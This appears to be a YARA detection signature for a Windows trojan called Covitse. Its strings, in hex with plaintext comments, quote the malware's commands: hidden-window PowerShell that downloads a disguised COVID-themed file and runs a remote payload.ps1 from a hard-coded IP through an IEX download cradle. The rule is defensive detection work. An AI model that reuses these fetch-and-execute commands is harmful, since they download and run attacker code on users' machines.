
rule Trojan_Win32_Covitse_M_MSR{
	meta:
		description = "Trojan:Win32/Covitse.M!MSR,SIGNATURE_TYPE_PEHSTR_EXT,06 00 06 00 03 00 00 "
		
	strings :
		$a_80_0 = {64 4f 77 4e 6c 4f 61 44 66 49 6c 45 28 27 68 74 74 70 3a 2f 2f 38 31 2e 31 30 33 2e 33 35 2e 34 34 2f 63 6f 76 69 64 31 39 5f 74 72 75 74 68 2e 6a 70 67 27 2c 20 27 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 63 6f 76 69 64 31 39 5f 74 72 75 74 68 2e 6a 70 67 27 29 } //dOwNlOaDfIlE('http://81.103.35.44/covid19_truth.jpg', 'C:\Users\Public\covid19_truth.jpg')  2
		$a_80_1 = {70 4f 77 45 72 53 68 45 6c 4c 20 2d 77 49 6e 20 31 20 2d 63 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 63 6f 76 69 64 31 39 5f 74 72 75 74 68 2e 6a 70 67 20 26 20 70 4f 77 45 72 53 68 45 6c 4c 20 2d 77 49 6e 20 31 20 2d 63 20 22 49 45 58 20 28 4e 65 57 2d 6f 42 6a 45 63 54 } //pOwErShElL -wIn 1 -c C:\Users\Public\covid19_truth.jpg & pOwErShElL -wIn 1 -c "IEX (NeW-oBjEcT  2
		$a_80_2 = {44 6f 57 6e 4c 6f 41 64 53 74 52 69 4e 67 28 27 68 74 74 70 3a 2f 2f 38 31 2e 31 30 33 2e 33 35 2e 34 34 2f 70 61 79 6c 6f 61 64 2e 70 73 31 27 29 } //DoWnLoAdStRiNg('http://81.103.35.44/payload.ps1')  2
	condition:
		((#a_80_0  & 1)*2+(#a_80_1  & 1)*2+(#a_80_2  & 1)*2) >=6
 
}